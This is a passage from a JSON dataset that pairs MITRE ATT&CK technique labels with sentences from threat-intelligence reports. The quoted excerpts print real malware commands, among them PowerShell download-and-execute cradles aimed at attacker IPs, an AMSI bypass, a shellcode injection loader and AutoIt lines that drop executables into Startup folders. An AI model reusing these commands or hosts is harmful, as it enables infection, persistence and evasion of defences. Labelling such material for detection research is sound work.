78adc8e5e4e86146317420fa3b2274c9805f6942c9973963467479cb1bbd4ead 054c5aa73d6b6d293170785a82453446429c0efc742df75979b760682ac3026b cac630c11c4bf6363c067fbf7741eae0ec70238d9c5e60d41f3ed8f65b56c1d1 ecc5805898e037c2ef9bc52ea6c6e59b537984f84c3d680c8436c6a38bdecdf4 215f7c08c2e3ef5835c7ebc9a329b04b8d5215773b7ebfc9fd755d93451ce1ae Cannon Related Emails sym777.g[at]post.cz kae.mezhnosh[at]post.cz vebek.morozh30[at]post.cz g0r7tsa45s[at]post.cz marvel.polezha[at]post.cz sahro.bella7[at]post.cz trala.cosh2[at]post.cz Bishtr.cam47[at]post.cz Lobrek.chizh[at]post.cz Cervot.woprov[at]post.cz heatlth500[at]ambcomission[.]com trash023[at]ambcomission[.]com trasler22[at]ambcomission[.]com rishit333[at]ambcomission[.]com tomasso25[at]ambcomission[.]com kevin30[at]ambcomission[.]com"
    ]
  },
  "event triggered execution: powershell profile": [
    "Its use of a PowerShell payload means that only legitimate system processes are utilized and that the malicious code execution can only be identified through enhanced logging or in memory",
    "Mandiant initially identified an early variant of the POSHSPY backdoor deployed as PowerShell scripts during an incident response engagement in 2015",
    "Figure 2: WindowsParentalControlsMigration CommandLineTemplate Figure 3 contains the decoded PowerShell command from the \u201cCommandLineTemplate.\u201d      Figure 3: Decoded CommandLineTemplate PowerShell code POSHSPY PowerShell Component The full code for a POSHSPY sample is available here",
    "Additional Reading This PowerShell logging blog post contains more information on improving PowerShell visibility in your environment",
    "However, in this new variant, all the DNS activity is initiated and executed solely from memory \u2013 unlike previous attacks which used PowerShell commands",
    "The PowerShell script executes a compressed first stage PowerShell child process, which then performs a second stage PowerShell process",
    "The PowerShell implant used in the Olympics campaign was a stager based on the PowerShell Empire framework that created an encrypted channel to the attacker\u2019s server",
    "(For more on steganography, see the McAfee Labs Threats Report, June 2017, page 33.) The implants covered in this research establish a permanent presence on the victim\u2019s system once the PowerShell implant is executed",
    "The main function performed by the SCT file is to Base64 decode the contents of WindowsDefender.ini file and execute the decoded PowerShell Script using the following command line: powershell.exe -exec Bypass -c iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((get-content C:\\\\ProgramData\\\\WindowsDefender.ini) The rest of the malicious activities are performed by the PowerShell Script",
    "PowerShell File Analysis The PowerShell script employs several layers of obfuscation to hide its actual functionality",
    "Figure 11: PowerShell script is XOR encoded using a single byte key After deobfuscating the contents of the PowerShell Script, we can divide it into three sections",
    "Section 1 The first section of the PowerShell script is responsible for setting different key variables that are used by the remaining sections of the PowerShell script, especially the following variables:  TEMpPAtH = \"C:\\ProgramData\\\" (the path used for storing the temp files) Get_vAlIdIP = https://api.ipify.org/ (used to get the public IP address of the machine) FIlENAmePATHP = WindowsDefender.ini (file used to store Powershell code) PRIVAtE = Private Key exponents PUbLIc = Public Key exponents Hklm = \"HKLM:\\Software\\\" Hkcu = \"HKCU:\\Software\\\" ValuE = \"kaspersky\" SYSID DrAGon_MidDLe = [array of proxy URLs]  Among those variables, there is one variable of particular interest, DrAGon_MidDLe, which stores the list of proxy URLs (detailed at the end of the blog in the Network Indicators portion of the Indicators of Compromise section) that will be used to interact with the C2 server, as shown in Figure 12",
    "The malicious macros were all designed to use Windows PowerShell to download a shellcode-based payload from a remote server",
    "The macro uses PowerShell to download a shellcode-based payload from a remote server using one of two available techniques",
    "On January 1, 2017, we observed this URL responding to the above HTTP request with the following data:powershell.exe -exec bypass -window hidden -noni -nop -encoded JABjAG8AbQBtAGEAbgBkACAAPQAgACcAVwB3AEIATwBBAEcAVQBBAGQAQQBBAHUAQQBGAE0AQQBaAFEAQgB5AEEASABZAEEAYQBRAEIAagBBAEcAVQBBAFUAQQBCAHYAQQBHAGsAQQBiAGcAQgAwAEEARQAwAEEAWQBRAEIAdQBBAEcARQBBAFoAdwBCAGwAQQBIAEkAQQBYAFEAQQA2AEEARABvAEEAVQB3AEIAbABBAEgASQBBAGQAZwBCAGwAQQBIAEkAQQBRAHcAQgBsAEEASABJAEEAZABBAEIAcABBAEcAWQBBAGEAUQBCAGoAQQBHAEUAQQBkAEEAQgBsAEEARgBZAEEAWQBRAEIAcwBBAEcAawBBAFoAQQBCAGgAQQBIAF..snip..As you can see, the C2 server responds with a PowerShell command that will run on the system",
    "The PowerShell command decodes to the following:$command = 'WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAHIAdgBlAHIAQwBlAHIAdABpAGYAaQBjAGEAdABlAFYAYQBsAGkAZABhAHQAaQBvAG4AQwBhAGwAbABiAGEAYwBrACAAPQAgAHsAJAB0AHIAdQBlAH0AOwAKACAAIAAgACAAdAByAHkAewAgAAoAIAAgACAAIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AQQBtAHMAaQBVAHQAaQBsAHMAJwApAC4ARwBlAHQARgBpAGUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACAAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQB0AFYAYQBsAHUAZQAoACQAbgB1AGwAbAAsACAAJAB0AHIAdQBlACkACgAgACAAIAAgAH0AYwBhAHQAYwBoAHsAfQAKACAAIAAgACAASQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAzADkALgA1ADkALgA0ADYALgAxADUANAA6ADMANAA4ADUALwBJAE0AbwA4AG8AbwBzAGkAZQBWAGEAaQAnACkAOwAKACAAIAAgACAA'         if ($Env:PROCESSOR_ARCHITECTURE -eq 'AMD64')          {                          $exec = $Env:windir + '\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe -exec bypass -window hidden -noni -nop -encoded ' + $command             IEX $exec         }         else         {             $exec = [System.Convert]::FromBase64String($command)             $exec = [Text.Encoding]::Unicode.GetString($exec)             IEX $exec         }The script above checks the system architecture to determine if it is an x64 machine and attempts to execute a base64 encoded command that decodes to the following:[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};     try{      [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true)     }catch{}     IEX (New-Object Net.WebClient).DownloadString('http:// 139.59.46[.]154:3485 /IMo8oosieVai');This decoded PowerShell script attempts to download and execute a file using HTTP from the URL \u201chxxp:// 139.59.46[.]154:3485 /IMo8oosieVai\u201d",
    "In the example above, the \u201cspp.exe\u201d executable would be added to an auto-run registry key at: SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\iexplore Many of the Fetch samples attempted to obfuscate their functionality by encrypting their embedded strings with AES using the same key \u201cagkrhfpdbvhdhrkj\u201d; however, the loader\u2019s main goal involved running the following command:/c powershell -window hidden -EncodedCommand JAAwAG8AOABlACAAPQAgACcAJABmADkAQgAgAD0AIAAnACcAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyAC4AZABsAGwAIgApAF0AcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAASQBuAHQAUAB0AHIAIABWAGkAcgB0AHUAYQBsAEEAbABsAG8AYwAoAEkAbgB0AFAAdAByACAAbABwAEEAZABkAHIAZQBzAHMALAAgAHUAaQBuAHQAIABkAHcAUwBpAHoAZQAsA&lt;snip&gt;The base64 encoded command decodes to the following:$0o8e = '$f9B = ''[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $f9B -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = &lt;shellcode REDACTED for brevity&gt;;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$rJr=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($rJr.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$rJr,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($0o8e));$DKn = \"-enc \";if([IntPtr]::Size -eq 8){$b32 = $env:SystemRoot + \"\\syswow64\\WindowsPowerShell\\v1.0\\powershell\";iex \"&amp; $b32 $DKn $e\"}else{;iex \"&amp; powershell $DKn $e\";}The decoded command above builds a buffer that it uses to store shellcode and creates a thread to execute it",
    "Upon execution in a vulnerable environment, the PowerShell based payload takes over",
    "The PowerShell script is responsible for downloading the final payload from C2 server to execute it",
    "Use of the non-public PowerShell backdoor previously described by Morphisec and MalwareBytes (which we refer to as POWERSTATS)",
    "Attacker deception and attribution The deobfuscated PowerShell code used by the MuddyWater group resembles previously seen PowerShell scripts that most likely served as prototypes",
    "Lock PowerShell Execution Policy, must be set to \u201cAllSigned\u201d via GPO",
    "These PowerShell scripts are final stage payloads \u2013 they include a downloader with domain generation algorithm (DGA) functionality and the backdoor component, which connect to the C2 server to receive commands and perform additional malicious activities.\u00a0 hUpdateCheckers.ps1 (POWRUNER) The backdoor component, POWRUNER, is a PowerShell script that sends and receives commands to and from the C2 server",
    "The contents within the releasenotes.txt file (SHA256: bf925f340920111b385078f3785f486fff1096fd0847b993892ff1ee3580fa9d) \u00a0contains the following formula that Excel will save to the \u201cA0\u201d cell in the worksheet:  The formula uses a command prompt to run a PowerShell script that attempts to download and execute a second PowerShell script hosted at the URL hxxp://micrrosoft[.]net/winupdate.ps1",
    "The decompressed PowerShell payload has some similarities to the PowerShell Empire agent, such as the use of a jitter value and commands referred to by job ID, but we do not have conclusive evidence that the author of this tool used Empire as a basis for their tool",
    "It will run the newly downloaded PowerShell script by running the following command via cmd /c:       wscript.exe \"Office365DCOMCheck.vbs\" \"PowerShell.exe-ExecutionPolicy bypass -WindowStyle hidden -NoProfile <path to Office365DCOMCheck.ps1 script>\"     The payload will then notify the C2 it has successfully downloaded and executed the secondary PowerShell payload",
    "The Information Gathering Tool (IGT) tool is coded in Delphi and includes powershell and SQL components across a dozen different drops",
    "The following shows this unused command, which exposed an additional server within Sofacy\u2019s infrastructure would download and execute an encoded PowerShell script from 92.114.92[.]102:       C:\\\\Programs\\\\Microsoft\\\\MSOffice\\\\Word.exe\\\\..\\\\..\\\\..\\\\..\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -NoP -sta -NonI -Whidden $e=(New-ObjectSystem.Net.webClient).downloadString('hxxp://92.114.92[.]102:80/d');powershell -enc $e #     The unused command above appears to be related to previous attacks, specifically attacks that occurred in November 2017 as discussed by McAfee and ESET",
    "The VBScript has a SHA256 has of 649e3922ec53d5b195ed23aac08148faeb561f47e891b1e6ff60a2a9df4fea17, which calls two PowerShell commands to download and execute a payload and downloading and opening of a decoy document",
    "Then, it will launch Dec.exe using PowerShell with the command \u201c cmd.exe /c powershell - WindowStyle Hidden Start-Process Dec.exe - WindowStyle maximized \u201d.",
    "FIN6 used PowerShell to execute an encoded command",
    "The attacker made use of Cobalt Strike\u2019s \u201cpsexec\u201d lateral movement command to create a Windows service named with a random 16-character string on the target system and execute encoded PowerShell",
    "After decoding out the blob, analysts found a PowerShell script.",
    "Next, the script triggered a PowerShell stager",
    "The macro contains a PowerShell script to persist in the \"Run\" registry key, \"KCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SystemTextEncoding\".",
    "Following successful infiltration, the malware persists through registry: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run The command line execution leads to PowerShell code executed from a different registry value .",
    "the PowerShell is executed using reflectively loaded ReflectivePicker from the Empire project",
    "PowerShell scripts that perform system reconnaissance and credential theft from Windows Credential Manager and then send this information back to Waterbug C& Cs.",
    "Adversaries may gain persistence and elevate privileges by executing malicious content triggered by PowerShell profiles. A PowerShell profile  (<code>profile.ps1</code>) is a script that runs when [PowerShell](https://attack.mitre.org/techniques/T1059/001) starts and can be used as a logon script to customize user environments.\n\n[PowerShell](https://attack.mitre.org/techniques/T1059/001) supports several profiles depending on the user or host program. For example, there can be different profiles for [PowerShell](https://attack.mitre.org/techniques/T1059/001) host programs such as the PowerShell console, PowerShell ISE or Visual Studio Code. An administrator can also configure a profile that applies to all users and host programs on the local computer. (Citation: Microsoft About Profiles) \n\nAdversaries may modify these profiles to include arbitrary commands, functions, modules, and/or [PowerShell](https://attack.mitre.org/techniques/T1059/001) drives to gain persistence. Every time a user opens a [PowerShell](https://attack.mitre.org/techniques/T1059/001) session the modified script will be executed unless the <code>-NoProfile</code> flag is used when it is launched. (Citation: ESET Turla PowerShell May 2019) \n\nAn adversary may also be able to escalate privileges if a script in a PowerShell profile is loaded and executed by an account with higher privileges, such as a domain administrator. (Citation: Wits End and Shady PowerShell Profiles)"
  ],
  "deobfuscate/decode files or information powershell-multi": {
    "technique_names": [
      "deobfuscate/decode files or information",
      "event triggered execution: powershell profile"
    ],
    "sentances": [
      "The subscription was configured to run a PowerShell command that read, decrypted, and executed the backdoor code directly from the new WMI property",
      "Upon execution, this command extracted, decrypted, and executed the PowerShell backdoor payload stored in the HiveUploadTask text property of the RacTask class"
    ]
  },
  "windows management instrumentation powershell-multi": {
    "technique_names": [
      "windows management instrumentation",
      "event triggered execution: powershell profile"
    ],
    "sentances": [
      "POSHSPY WMI Component The WMI component of the POSHSPY backdoor leverages a Filter to execute the PowerShell component of the backdoor on a regular basis"
    ]
  },
  "system owner/user discovery masquerading account discovery scripting user execution-multi": {
    "technique_names": [
      "system owner/user discovery",
      "masquerading",
      "account discovery",
      "command and scripting interpreter",
      "user execution"
    ],
    "sentances": [
      "Figure 2: Textbox inside DOC The combined script from Word textbox drops the following components: \\Users\\[user_name]\\Intel\\58d2a83f7778d5.36783181.vbs \\Users\\[user_name]\\Intel\\58d2a83f777942.26535794.ps1 \\Users\\[user_name]\\Intel\\58d2a83f777908.23270411.vbs Also, the script creates a named schedule task for persistence to launch \u201c58d2a83f7778d5.36783181.vbs\u201d every 25 minutes"
    ]
  },
  "obfuscated files or information powershell-multi": {
    "technique_names": [
      "obfuscated files or information",
      "event triggered execution: powershell profile"
    ],
    "sentances": [
      "PowerShell Script \u201c58d2a83f777942.26535794.ps1\u201d is a multilayer obfuscated PowerShell script, which launches shellcode for a Cobalt Strike stager"
    ]
  },
  "file deletion exfiltration over command and control channel-multi": {
    "technique_names": [
      "indicator removal on host: file deletion",
      "exfiltration over c2 channel"
    ],
    "sentances": [
      "This version of HALFBAKED connects to the following C2 server: hxxp://198[.]100.119.6:80/cd hxxp://198[.]100.119.6:443/cd hxxp://198[.]100.119.6:8080/cd This version of HALFBAKED listens for the following commands from the C2 server:  info: Sends victim machine information (OS, Processor, BIOS and running processes) using WMI queries processList: Send list of process running screenshot: Takes screen shot of victim machine (using 58d2a83f777688.78384945.ps1) runvbs: Executes a VB script runexe: Executes EXE file runps1: Executes PowerShell script delete: Delete the specified file update: Update the specified file  All communication between the backdoor and attacker C2 are encoded using the following technique, represented in pseudo code: Function send_data(data) \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0random_string = custom_function_to_generate_random_string() \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0encoded_data = URLEncode(SimpleEncrypt(data)) \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0post_data(\"POST\u201d, random_string & \"=\" & encoded_data, Hard_coded_c2_url, Create_Random_Url(class_id)) The FireEye iSIGHT Intelligence MySIGHT Portal contains additional information based on our investigations of a variety of topics discussed in this post, including FIN7 and the HALFBAKED backdoor"
    ]
  },
  "timestomp system information discovery shortcut modification-multi": {
    "technique_names": [
      "indicator removal on host: timestomp",
      "system information discovery",
      "boot or logon autostart execution: shortcut modification"
    ],
    "sentances": [
      "For example, one of these FIN7 LNK files contained the following properties:  Version: 0 NetBIOS name: andy-pc Droid volume identifier: e2c10c40-6f7d-4442-bcec-470c96730bca Droid file identifier: a6eea972-0e2f-11e7-8b2d-0800273d5268 Birth droid volume identifier: e2c10c40-6f7d-4442-bcec-470c96730bca Birth droid file identifier: a6eea972-0e2f-11e7-8b2d-0800273d5268 MAC address: 08:00:27:3d:52:68 UUID timestamp: 03/21/2017 (12:12:28.500) [UTC] UUID sequence number: 2861  From this LNK file, we can see not only what the shortcut launched within the string data, but that the attacker likely generated this file on a VirtualBox system with hostname \u201candy-pc\u201d on March 21, 2017"
    ]
  },
  "system owner/user discovery scripting-multi": {
    "technique_names": [
      "system owner/user discovery",
      "command and scripting interpreter"
    ],
    "sentances": [
      "JAVASCRIPT CODE SNIPPETS:  The first stage JavaScript copies additional JavaScript code snippets in txt format from the RTF document into a random directory \u201cC:\\Users\\<User Name>\\<Random guid>\\\u201d"
    ]
  },
  "scheduled task data staged scripting obfuscated files or information-multi": {
    "technique_names": [
      "scheduled task/job",
      "data staged",
      "command and scripting interpreter",
      "obfuscated files or information"
    ],
    "sentances": [
      "Additionally, the first stage JavaScript creates a scheduled task that executes the second stage code within a minute \u2013 this delayed execution helps to bypass behavior analysis since the second stage is not directly executed by the first stage"
    ]
  },
  "scripting powershell-multi": {
    "technique_names": [
      "command and scripting interpreter",
      "event triggered execution: powershell profile"
    ],
    "sentances": [
      "This task is executed every 25 minutes and will repeat the actions described above \u2013 recreating the JavaScript code which later will create and execute a PowerShell script (described below)",
      "The latter PowerShell injects a shellcode into its own process using well-known CreateThread and VirtualAlloc techniques: \u00a0 SHELLCODE: The shellcode phase of this attack is unique and demonstrates the constantly advancing abilities of attackers",
      "The fact that the actor used Metasploit shellcode within the Unicorn generated PowerShell script leads us to speculate that the ultimate payload of this attack is Meterpreter, which is a shellcode-based payload",
      "The x command treats the supplied data as a PowerShell script that it will write to the current PowerShell script (Office365DCOMCheck.ps1/SystemDiskClean.ps1), effectively overwriting the initial PowerShell script with a secondary payload script"
    ]
  },
  "scripting registry run keys / startup folder powershell-multi": {
    "technique_names": [
      "command and scripting interpreter",
      "boot or logon autostart execution: registry run keys / startup folder",
      "event triggered execution: powershell profile"
    ],
    "sentances": [
      "SECOND STAGE JAVASCRIPT INTO POWERSHELL: The second stage JavaScript creates a PowerShell file with the same name in the same directory"
    ]
  },
  "audio capture data encoding-multi": {
    "technique_names": ["audio capture", "data encoding"],
    "sentances": [
      "Having a Meterpreter session on a compromised computer allows for full control of the computer and exfiltration of any data, and in some cases lateral movement inside the organization"
    ]
  },
  "masquerading file and directory discovery data staged-multi": {
    "technique_names": [
      "masquerading",
      "file and directory discovery",
      "data staged"
    ],
    "sentances": [
      "Stage 1 sample file: 3amadi_hamas.zip MD5: e686ffa90b2bfb567547f1c0dad1ae0b Type: Compressed container Child file/lure name: \u0645\u062d\u0636\u0631 \u0627\u062c\u062a\u0645\u0627\u0639 \u0627\u0644\u0639\u0645\u0627\u062f\u064a \u0645\u0639 \u0647\u0646\u064a\u0629 \u0631\u064a\u0654\u064a\u0633 \u062d\u0645\u0627\u0633 \u0627\u0645\u0633 \u0627\u0644\u0627\u062d\u062f .exe Child file/lure MD5: 92dd0f16e8ae274d83ba1d0d5b2e342  This sample ZIP file, which is similar to many other stage 1 downloaders in this campaign, contains an executable that is a compiled AutoIt script and which embeds some interesting functions (listed in the table below)"
    ]
  },
  "masquerading registry run keys / startup folder-multi": {
    "technique_names": [
      "masquerading",
      "boot or logon autostart execution: registry run keys / startup folder"
    ],
    "sentances": [
      "Embedded functions Sleep, 15000  UrlDownloadToFile, https://upload.cat/0037e96c45ac2098?download_token=fa26750b7e73f0081c44831d0aaf9863c75592724dbc2f781ca495f9b5fbd4ac, %AppData%\\Microsoft\\Windows\\Picture2.exe 6240c31d9a82dc70a38f78d44a1ee239  sleep,4000  UrlDownloadToFile, https://upload.cat/089590f6d72aeaef?download_token=dd21809321669aa2229b20b57e2c9d34a3b507b5df7406bcac5dbb87cd169b78, %AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Picture4.exe cab62bb5f00fe15683c6af760c8e8f7e  sleep,4000  UrlDownloadToFile, https://dev-point.co/uploads1/4ee1d5a5b0e41.jpg, %AppData%\\Thr0om.jpg  c90f9c600169cbedbeb23316ea61e214  sleep,4000  UrlDownloadToFile, https://upload.cat/ec9d388339b19e1c?download_token=131d5450c192d0591f3d06841eacc5bf5f344be9725be9456e2c222d0b4831e2, %AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\333Po333.exe 8c5f8d1ab7baa9a0764cd5650ddecd8e  sleep,5000  UrlDownloadToFile, https://upload.cat/9a08bc13e683d330?download_token=90f1ebb4e1f52835f502bea4307686afc1eb1cdee973cef1fb043febb2a92078, %AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsFrom444444.exe 2a3aa1d207030d8c7dc3cfc9c2d9f9f1  sleep,5000  UrlDownloadToFile, https://upload.cat/a1c05c819dadeefb?download_token=c6535b11a9f9bbf9e7681be8753f2058bac0df5264744be76605244e96a388f5, %AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsFrom355353.exe bd83269da75741303a19b826c5f9627d  sleep,5000  RunWait %AppData%\\Microsoft\\Windows\\Picture2.exe ,, hide sleep,2000 After analyzing the files downloaded from the above first stage malware, it was clear that the threat actor wanted to achieve stable persistence on the victim machine, and also used more than one technique to exfiltrate data"
    ]
  },
  "data from local system file and directory discovery data staged-multi": {
    "technique_names": [
      "data from local system",
      "file and directory discovery",
      "data staged"
    ],
    "sentances": [
      "The threat actor\u2019s main objective for using this RAT (known as Razy/NeD worm/Wonder Botnet) was obvious from the victim data that was collected \u2013 it was to search for specific file extensions such as PDF, DOC, DOCX, XLS, and XLSX, where they are compressed in RAR files per category, stored in temp directories within a folder named by victim ID (bot ID \u2013 long MD5 string), encrypted and uploaded to the C2"
    ]
  },
  "standard application layer protocol command-line interface-multi": {
    "technique_names": [
      "application layer protocol",
      "command and scripting interpreter"
    ],
    "sentances": [
      "SHUTDOWN Shuts down the system using cmd /s /t 0   RESTART Reboots the system using cmd /r /t 0   PROCANDSOFT Lists all active processes and all installed software and uploads the results to the C2 server using a POST command at the \u201c/log.php\u201d",
      "Available Commands The XAgent C2 server will provide commands for the Trojan to run on the compromised system within its response to inbound HTTP request"
    ]
  },
  "exfiltration over command and control channel data compressed-multi": {
    "technique_names": [
      "exfiltration over c2 channel",
      "archive collected data"
    ],
    "sentances": [
      "RAR Creates RAR files per logical drive containing data with timestamps for the past 7 days, then uploads RAR to the C2 server using a POST command at the path \u201c/FeedBack.php\u201d"
    ]
  },
  "process hollowing masquerading exploitation for privilege escalation-multi": {
    "technique_names": [
      "process injection: process hollowing",
      "masquerading",
      "exploitation for privilege escalation"
    ],
    "sentances": [
      "Appendix I \u2013 Main historical checkpoints and politicized decoys Gaza Cybergang Group1 2016-2019    MD5 Hash First seen Filename/Decoy Translation/Explanation C2 server   B3a472f81f800b32fe6595f44c9bf63b Feb 2016 \u0628\u0631\u0642\u064a\u0629 \u0648\u0632\u0627\u0631\u0629 \u0627\u0644\u062e\u0627\u0631\u062c\u064a\u0629 \u0627\u0644\u062a\u0631\u0643\u064a\u0629 \u0644\u0633\u064a\u0627\u062f\u062a\u0643\u0645 \u062d\u0648\u0644 \u0645\u0648\u0636\u0648\u0639 \u0647\u0627\u0645.exe  Translation: Letter for you from the Turkish Ministry of Foreign Affairs on Russian military operations in Syria en.gameoolines.com (185.117.72.190)   Df3f3ad279ca98f947214ffb3c91c514 e8a29c7a6f6c0140152ca8a01e336b37 March 2016 president abu mazen meetings with khaled meshaal.lha   dw.downloadtesting.com (185.117.75.105)   f9bcc21fbb40247167c8c85ed6ef56e3 March 2016 \u062f\u0631\u0627\u0633\u0629.lha   Dl.topgamse.com (45.63.97.44)   D9dbb65a42ffe0575f0e99f7498a593e April 2016 \u0628\u0631\u0642\u064a\u0629 \u0627\u0644\u062e\u0627\u0631\u062c\u064a\u0629 \u0627\u0644\u0633\u0639\u0648\u062f\u064a\u0629 \u0644\u0633\u064a\u0627\u062f\u062a\u0643\u0645 \u064a\u0631\u062c\u064a \u0627\u0644\u0625\u0637\u0644\u0627\u0639 \u2013 \u0645\u0647\u0645.exe  Translation: Saudi Foreign Affairs telegram for you, please see \u2013 important.exe en.gameoolines.com (185.117.72.190)   221EEF8511169C0496BBC79F96E84A4A April 2016 \u062a\u0642\u0631\u064a\u0631 \u0627\u0644\u0633\u0639\u0648\u062f\u064a\u0629 \u0648\u0627\u0644\u0645\u0639\u0644\u0648\u0645\u0627\u062a \u0627\u0644\u0645\u062a\u0648\u0641\u0631 \u2013 \u0648\u0646\u0633\u062a\u0643\u0645\u0644 \u0639\u0646\u062f \u0627\u0644\u062a\u0648\u0641\u0631.exe  Translation: Report on Saudi available information, to be updated with new info upon availability dw.downloadtesting.com (185.117.75.105)   62DF4BC3738BE5AD4892200A1DC6B59A Inside: 55d33d9da371fdfe7871f2479621444a May 2016 \u0645\u0639\u0644\u0648\u0645\u0627\u062a \u0639\u0646 \u0647\u062c\u0648\u0645 \u0645\u062d\u062a\u0645\u0644 \u0645\u0646 \u0627\u0644\u062d\u0648\u062b\u064a\u064a\u0646 \u0639\u0644\u0649 \u0645\u0648\u0627\u0642\u0639 \u0633\u0639\u0648\u062f\u064a\u0629 \u2013 \u062e\u0627\u0635.exe  Translation: Information on possible attack by Houthis on Saudi sites \u2013 private dw.downloadtesting.com (185.117.75.105)   838696872F924D28B08AAAA67388202E May 2016 \u0639\u0627\u062c\u0644 \u0627\u0644\u0645\u062e\u0627\u0628\u0631\u0627\u062a \u0627\u0644\u0645\u0635\u0631\u064a\u0629.exe  Translation: Urgent Egyptian Intelligence dw.downloadtesting.com (185.117.75.105)   e8be9843c372d280a506ac260567bf91 May 2016 \u0628\u0631\u0642\u064a\u0629 \u0648\u0632\u0627\u0631\u0629 \u0627\u0644\u062e\u0627\u0631\u062c\u064a\u0629 \u0627\u0644\u0633\u0639\u0648\u062f\u064a\u0629.exe  Translation: Saudi Foreign Affairs telegram.exe Message on the 34th GCC for Interior Ministers",
      "The webpage contained both CVE-2014-6332 exploit code and a VBScript that invoked PowerShell on the affected users\u2019 system to download the below payload: \u00a0\u00a0\u00a0 function runmumaa() \u00a0\u00a0\u00a0 On Error Resume Next \u00a0\u00a0\u00a0 set shell=createobject(\"Shell.Application\") \u00a0\u00a0\u00a0 shell.ShellExecute \"powershell.exe\",\"-NoLogo -NoProfile \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 -NonInteractive -WindowStyle Hidden ( New-Object \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u201cSystem.Net.WebClient\u201d).DownloadFile(\u201chttp://www.playboysplus.com\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 /install/install.exe\u201d,\u201dinstall.exe\u201d);Invoke-Item install.exe\", \"\", \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \"open\", 1 \u00a0\u00a0\u00a0 end function The CVE-2014-6332 exploit code seen in this incident is derived from the code published at http://www.exploit-db.com/exploits/35230/, which has also been incorporated in the Metasploit project"
    ]
  },
  "process hollowing custom cryptographic protocol masquerading process injection regsvr32 web service exfiltration over command and control channel network service scanning system time discovery windows admin shares-multi": {
    "technique_names": [
      "process injection: process hollowing",
      "encrypted channel",
      "masquerading",
      "process injection",
      "system binary proxy execution: regsvr32",
      "web service",
      "exfiltration over c2 channel",
      "network service discovery",
      "system time discovery",
      "remote services: smb/windows admin shares"
    ],
    "sentances": [
